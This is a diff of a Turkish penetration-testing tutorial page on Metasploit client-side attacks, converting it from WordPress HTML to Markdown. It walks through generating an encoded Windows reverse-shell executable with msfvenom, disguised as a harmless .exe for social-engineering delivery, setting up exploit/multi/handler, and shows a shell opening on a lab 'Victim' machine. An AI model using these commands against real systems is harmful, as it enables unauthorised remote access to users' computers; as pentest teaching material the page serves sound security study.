@@ -28,39 +28,27 @@ title: MSF Binary Payloads
 url: /tr/msf-binary-payloads/
 ---
 
-<!-- wp:heading {"level":1} -->
-<h1 class="wp-block-heading" id="i̇stemci-taraflı-saldırılar">İstemci Taraflı Saldırılar 
-<!-- /wp:heading -->
+# İstemci Taraflı Saldırılar
 
-  İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar. 
- 
+İstemci tarafı saldırılar, tüm ağ yöneticilerinin dikkat etmesi gerekli türden saldırılardır. Sisteminizin güvenliğini ne kadar sağlasanız da istemci tarafı saldırılar, kullanıcılarınızın zafiyetlerini kullanırlar. 
 
-  Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir. 
- 
+Pentest işlemi gerçekleştirenler, sistemde bulunan kullanıcının, bir şekilde linke tıklamasını veya zararlı yazılım çalıştırmasını sağladığında kendilerine hedef sistemde kapı açmış olurlar. Bu sebeple, istemci taraflı saldırılar, kullanıcıyla etkileşim gerektirmektedir. Bu tür saldırılar, sosyal mühendislik çalışmalarını da gerektirir.
 
-  Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır. 
- 
+Metasploit Framework, bu tür zararlı kodların oluşturması için bir çok modül sağlamaktadır.
 
-<!-- wp:heading {"level":1} -->
-<h1 class="wp-block-heading" id="binary-payloads">binary payloads 
-<!-- /wp:heading -->
+# binary payloads
 
-  binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır. 
- 
+binary payloads olarak adlandırılan çalıştırılabilir dosyalar, zararsız .exe dosyaları gibi görünse de aslında içinde tehlikeli kodlar bulunduran dosyalardır. Dosyayı alacak kullanıcıya, önemli bir dosya hissi uyandırarak tıklaması sağlanır ve zararlı kod çalışır. 
 
-  Bu yazıda, Metasploit Framework tarafından sağlanan&nbsp;<code>msfvenom</code>&nbsp;komut satırı aracı kullanılacaktır.&nbsp;<code>msfvenom</code>&nbsp;kullanarak&nbsp;<code>.exe</code>,&nbsp;<code>perl</code>&nbsp;veya&nbsp;<code>c</code>&nbsp;program çıktıları elde edebilirsiniz. Burada&nbsp;<code>.exe</code>&nbsp;formatı kullanılacaktır. 
- 
+Bu yazıda, Metasploit Framework tarafından sağlanan ```msfvenom``` komut satırı aracı kullanılacaktır. ```msfvenom``` kullanarak ```.exe```, ```perl``` veya ```c``` program çıktıları elde edebilirsiniz. Burada ```.exe``` formatı kullanılacaktır. 
 
- 
-<h2 class="wp-block-heading" id="windows-reverse-shell-açan-payload-oluşturma">Windows Reverse Shell Açan Payload Oluşturma
-<!-- /wp:heading -->
+## Windows Reverse Shell Açan Payload Oluşturma
 
-  Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için&nbsp;<code>windows/shell/reverse_tcp</code>&nbsp;modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım. 
- 
+Hedef kullanıcının zararlı programı çalıştırdığında dinleyen IP adresine bağlanması için bir payload oluşturmak için ```windows/shell/reverse_tcp``` modülünü kullanacağız. Öncelikle bu modülün çalışmak için hangi değişkenlere ihtiyaç duyduğuna bakalım.
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
-Options ***for *** payload/windows/shell/reverse_tcp:
+```sh
+root@kali:~# msfvenom --payload-options -p windows/shell/reverse_tcp
+Options for payload/windows/shell/reverse_tcp:
 
 
        Name: Windows Command Shell, Reverse TCP Stager
@@ -80,51 +68,40 @@ Provided by:
 Basic options:
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
-EXITFUNC  process          yes       Exit technique ***(*** Accepted: '', seh, thread, process, none***)*** 
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
 LHOST                      yes       The listen address
 LPORT     4444             yes       The listen port
 
 Description:
-  Spawn a piped command shell ***(*** staged***)*** . Connect back to the attacker
-</code></pre>
-<!-- /wp:code -->
+  Spawn a piped command shell (staged). Connect back to the attacker
+```
+Bu modül, çıktıda görüldüğü gibi ```LHOST``` ve ```LPORT``` değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de ```x86/shikata_ga_nai``` encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak ```/tmp``` klasörünün içinde ```1.exe``` isimli bir dosya oluşturacaktır.
 
-  Bu modül, çıktıda görüldüğü gibi&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değişkenlerinin ayarlanmasına ihtiyaç duymaktadır. Hedef platform olarak x86 mimari ve Windows işletim sistemi seçilmiştir. Oluşturacağımız payload için bir encoder kullanmamız gerekiyor. Bunun için de&nbsp;<code>x86/shikata_ga_nai</code>&nbsp;encoder modülünü kullanacağız. Bu şartlar altında aşağıdaki komut, encoder kullanarak&nbsp;<code>/tmp</code>&nbsp;klasörünün içinde&nbsp;<code>1.exe</code>&nbsp;isimli bir dosya oluşturacaktır. 
- 
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST***=*** 172.16.104.130 LPORT***=*** 31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
+```sh
+root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai succeeded with size 326 ***(*** iteration***=*** 0***)*** 
+x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai chosen with final size 326
 Payload size: 326 bytes
 Saved as: /tmp/1.exe
-</code></pre>
-<!-- /wp:code -->
+```
+```1.exe``` dosyamızın türünü kontrol edelim. ```file``` komutuyla yaptığımız kontrolde ```1.exe``` doyasının MS Windows dosyası olduğu aşağıda görülmektedir.
 
-  <code>1.exe</code>&nbsp;dosyamızın türünü kontrol edelim.&nbsp;<code>file</code>&nbsp;komutuyla yaptığımız kontrolde&nbsp;<code>1.exe</code>&nbsp;doyasının MS Windows dosyası olduğu aşağıda görülmektedir. 
- 
+```sh
+root@kali:~# file /tmp/1.exe
+/tmp/1.exe: PE32 executable (GUI) Intel 80386, for MS Windows
+```
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# file /tmp/1.exe
-/tmp/1.exe: PE32 executable ***(*** GUI***)***  Intel 80386, ***for *** MS Windows
-</code></pre>
-<!-- /wp:code -->
+## Dinleme Ayarları
 
- 
-<h2 class="wp-block-heading" id="dinleme-ayarları">Dinleme Ayarları
-<!-- /wp:heading -->
+Elimizde istemcinin tıklayıp çalıştıracağı ```1.exe``` dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için ```exploit/multi/handler``` modülünü ve içinde ```payload windows/shell/reverse_tcp``` dinleyici payload u kullanacağız.
 
-  Elimizde istemcinin tıklayıp çalıştıracağı&nbsp;<code>1.exe</code>&nbsp;dosyası artık hazır durumda. Şimdi, tıklama işlemi gerçekleştiğinde dinleyecek bir modülü çalıştırmamız gerekiyor. Bunun için&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü ve içinde&nbsp;<code>payload windows/shell/reverse_tcp</code>&nbsp;dinleyici payload u kullanacağız. 
- 
+Öncelikle ```exploit/multi/handler``` modülünü yükleyip seçeneklere bakalım.
 
-  Öncelikle&nbsp;<code>exploit/multi/handler</code>&nbsp;modülünü yükleyip seçeneklere bakalım. 
- 
-
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use exploit/multi/handler
-msf exploit***(*** handler***)***  ***&gt;***  show options
+```sh
+msf > use exploit/multi/handler
+msf exploit(handler) > show options
 
 Module options:
 
@@ -137,16 +114,14 @@ Exploit target:
    Id  Name            
    --  ----            
    0   Wildcard Target
-</code></pre>
-<!-- /wp:code -->
+``` 
 
-  Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım. 
- 
+Gördüğünüz gibi exploit modülünde herhangi bir zorunlu değişken bulunmuyor. Şimdi payload ayarlaması yapalım.
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  set payload windows/shell/reverse_tcp
-payload ***=&gt;***  windows/shell/reverse_tcp
-msf exploit***(*** handler***)***  ***&gt;***  show options
+```sh
+msf exploit(handler) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf exploit(handler) > show options
 
 Module options:
 
@@ -154,7 +129,7 @@ Module options:
    ----  ---------------  --------  -----------
 
 
-Payload options ***(*** windows/shell/reverse_tcp***)*** :
+Payload options (windows/shell/reverse_tcp):
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
@@ -168,44 +143,38 @@ Exploit target:
    Id  Name
    --  ----
    0   Wildcard Target 
-</code></pre>
-<!-- /wp:code -->
+```
 
-  Bu çıktıda görülmektedir ki Payload için&nbsp;<code>LHOST</code>&nbsp;ve&nbsp;<code>LPORT</code>&nbsp;değerlerinin girilmesi gerekmekte. 
- 
+Bu çıktıda görülmektedir ki Payload için ```LHOST``` ve ```LPORT``` değerlerinin girilmesi gerekmekte.
 
-  <code>LHOST</code>: Local Host yani yerelde dinleyecek IP adresini, 
- 
+```LHOST```: Local Host yani yerelde dinleyecek IP adresini, 
 
-  <code>LPORT</code>: Local Port, yani dinleyecek Port numarasını ifade eder. 
- 
+```LPORT```: Local Port, yani dinleyecek Port numarasını ifade eder. 
 
-  Bu değerlerin,&nbsp;<code>msfvenom</code>&nbsp;komutuyla oluşturduğumuz&nbsp;<code>1.exe</code>&nbsp;dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin.&nbsp;<code>1.exe</code>&nbsp;dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir. 
- 
+Bu değerlerin, ```msfvenom``` komutuyla oluşturduğumuz ```1.exe``` dosyası için girdiğimiz değerler ile aynı olmasına dikkat edin. ```1.exe``` dosyası içinde hangi değerler gömülü ise zararlı yazılım bu bilgilere göre haberleşme sağlamak isteyecektir.
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  set LHOST 172.16.104.130
-LHOST ***=&gt;***  172.16.104.130
-msf exploit***(*** handler***)***  ***&gt;***  set LPORT 31337
-LPORT ***=&gt;***  31337
-msf exploit***(*** handler***)***  ***&gt;*** 
-</code></pre>
-<!-- /wp:code -->
+```sh
+msf exploit(handler) > set LHOST 172.16.104.130
+LHOST => 172.16.104.130
+msf exploit(handler) > set LPORT 31337
+LPORT => 31337
+msf exploit(handler) >
+```
 
-  Tüm ayarlamaları yaptıktan sonra&nbsp;<code>exploit</code>&nbsp;komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir. 
- 
+Tüm ayarlamaları yaptıktan sonra ```exploit``` komutuyla modül çalıştırılır ve dinlemeye başlanır. Aşağıda, dinleme sonucunda gerçekleşen bir istemci tıklaması sonucu açılan komut satırı görülmektedir.
 
-<!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** handler***)***  ***&gt;***  exploit
+```sh
+msf exploit(handler) > exploit
 
-***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
-***[*** ******* ***]***  Started reverse handler
-***[*** ******* ***]***  Starting the payload handler...
-***[*** ******* ***]***  Sending stage ***(*** 474 bytes***)*** 
-***[*** ******* ***]***  Command shell session 2 opened ***(*** 172.16.104.130:31337 -&gt; 172.16.104.128:1150***)*** 
+[*] Handler binding to LHOST 0.0.0.0
+[*] Started reverse handler
+[*] Starting the payload handler...
+[*] Sending stage (474 bytes)
+[*] Command shell session 2 opened (172.16.104.130:31337 -> 172.16.104.128:1150)
 
-Microsoft Windows XP ***[*** Version 5.1.2600]
-***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
 
-C:\Documents and Settings\Victim\My Documents&gt;</code></pre>
-<!-- /wp:code -->
+C:\Documents and Settings\Victim\My Documents>
+```
+
